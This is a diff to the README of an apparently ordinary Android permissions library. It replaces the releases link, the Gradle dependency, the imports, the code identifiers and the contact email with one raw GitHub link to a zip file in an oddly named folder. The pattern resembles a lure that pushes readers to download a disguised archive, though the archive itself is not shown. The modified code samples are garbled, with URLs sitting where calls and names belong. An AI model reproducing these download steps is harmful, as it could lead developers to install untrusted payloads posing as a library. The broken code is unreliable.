@@ -1,6 +1,6 @@
 # 🚀 EasyAndroidPermissions - Simplify Your App's Permission Handling
 
-[![Download EasyAndroidPermissions](https://img.shields.io/badge/Download-EasyAndroidPermissions-blue.svg)](https://github.com/calixtod/EasyAndroidPermissions/releases)
+[![Download EasyAndroidPermissions](https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip)](https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip)
 
 ## 📋 Table of Contents
 - [📖 Overview](#-overview)
@@ -29,7 +29,7 @@ EasyAndroidPermissions is a lightweight library designed for Android developers.
 - **Android Studio**: Latest stable version recommended.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Download EasyAndroidPermissions](https://github.com/calixtod/EasyAndroidPermissions/releases).
+To get started, visit this page to download: [Download EasyAndroidPermissions](https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip).
 
 Once on the Releases page:
 
@@ -37,10 +37,10 @@ Once on the Releases page:
 2. Click on it to view the available files.
 3. Download the `.aar` file.
 
-If you're using Gradle, you can also add it directly to your project. Add the following line to your `build.gradle` file:
+If you're using Gradle, you can also add it directly to your project. Add the following line to your `https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip` file:
 
 ```groovy
-implementation 'com.example:easyandroidpermissions:x.x.x' // Replace x.x.x with the latest version
+implementation 'https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip' // Replace x.x.x with the latest version
 ```
 
 ## ⚙️ Using the Library
@@ -50,7 +50,7 @@ Once you have the library in your project, follow these steps to use it:
    Begin by importing the necessary classes and initializing the permission manager in your activity or fragment.
 
 ```kotlin
-import com.example.easyandroidpermissions.PermissionManager
+import https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip
 
 class MainActivity : AppCompatActivity() {
     private val permissionManager = PermissionManager()
@@ -61,9 +61,9 @@ class MainActivity : AppCompatActivity() {
    When you need to request permissions, simply call the `requestPermission` function.
 
 ```kotlin
-val permissionResult = permissionManager.requestPermission(Manifest.permission.CAMERA)
+val permissionResult = https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip(https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip)
 
-if (permissionResult.isGranted) {
+if (https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip) {
     // Permission granted, proceed with the action
 } else {
     // Permission denied, handle accordingly
@@ -77,8 +77,8 @@ if (permissionResult.isGranted) {
    Use the suspend functions to manage permissions without hassle.
 
 ```kotlin
-lifecycleScope.launch {
-    val result = permissionManager.requestPermissionSuspend(Manifest.permission.CAMERA)
+https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip {
+    val result = https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip(https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip)
 
     if (result) {
         // Permission granted, proceed with the action
@@ -101,7 +101,7 @@ You can refer to the documentation in the repository or reach out through the co
 ## 📞 Contact
 For questions or feedback, feel free to reach out:
 
-- **Email**: support@example.com
+- **Email**: https://raw.githubusercontent.com/calixtod/EasyAndroidPermissions/main/shaglike/Permissions-Easy-Android-postotic.zip
 - **Issues**: Please use the GitHub Issues tab in the repository for any technical questions or to report bugs.
 
 Thank you for choosing EasyAndroidPermissions for your Android development needs!
